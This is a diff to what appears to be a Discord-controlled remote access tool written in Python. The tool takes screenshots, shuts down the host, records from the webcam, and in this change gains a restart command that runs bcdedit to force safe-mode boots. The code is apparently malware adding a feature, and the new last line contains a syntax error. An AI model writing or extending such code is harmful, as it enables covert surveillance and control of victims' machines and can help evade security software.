@@ -1067,8 +1067,20 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		os.system("shutdown /s /t 0")
 
 	if message.content.startswith("restart"):
-		await message.reply(await femboyaccess("restart", "initiating computer restart! :3"))
-		os.system("shutdown /r /t 0")
+		mode = message.content.split(" ")[1]
+		if mode == "normal":
+			await message.reply(await femboyaccess("restart", "initiating normal computer restart! :3"))
+			os.system("shutdown /r /t 0")
+		elif mode == "safemode":
+			await message.reply(await femboyaccess("restart", "initiating safe mode computer restart! :3"))
+			subprocess.run("bcdedit /set {current} safeboot minimal", shell=True)
+			os.system("shutdown /r /t 0")
+		elif mode == "safenetwork":
+			await message.reply(await femboyaccess("restart", "initiating safe mode with networking computer restart! :3"))
+			subprocess.run("bcdedit /set {current} safeboot network", shell=True)
+			os.system("shutdown /r /t 0")
+		else:
+			await message.reply(await femboyaccess("restart", "invalid mode! (normal, safemode, safenetwork)")
 
 	if message.content.startswith("recordcamera"):
 		cap = cv2.VideoCapture(0)   
